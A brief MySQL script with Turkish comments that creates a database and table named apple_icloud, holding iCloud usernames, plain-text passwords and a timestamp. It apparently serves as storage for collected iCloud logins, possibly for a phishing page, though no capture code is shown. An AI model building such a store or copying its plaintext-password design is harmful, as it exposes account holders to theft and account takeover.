				-- VERİ TABANI OLUŞTURMA --

CREATE DATABASE apple_icloud DEFAULT CHARACTER SET utf8 COLLATE utf8_turkish_ci;

				-- TABLO OLUŞTURMA  --

CREATE TABLE apple_icloud(

    id SMALLINT AUTO_INCREMENT PRIMARY KEY,
    icloud_username varchar(120) NOT NULL,
    icloud_password varchar(120) NOT NULL,
    Kayıt_Tarih datetime DEFAULT CURRENT_TIMESTAMP

);
